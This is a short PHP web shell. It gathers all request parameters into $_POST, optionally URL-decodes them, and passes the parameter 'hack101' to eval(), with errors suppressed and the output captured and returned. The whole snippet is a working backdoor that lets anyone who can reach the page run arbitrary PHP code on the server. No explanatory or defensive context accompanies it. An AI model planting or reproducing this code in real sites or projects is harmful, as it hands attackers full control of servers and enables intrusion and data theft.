function handlerPostData(){
    $req=getAllParameters();
    foreach ($req as $key => $value) {
        if (get("isUrlDecode")==="true"){
            $_POST[$key]=urldecode($value);
        }else{
            $_POST[$key]=$value;
        }
    }
}
handlerPostData();

@ob_start();
$result=@eval($_POST["hack101"]);
$result = $result.@ob_get_contents();
@ob_end_clean();
return $result;
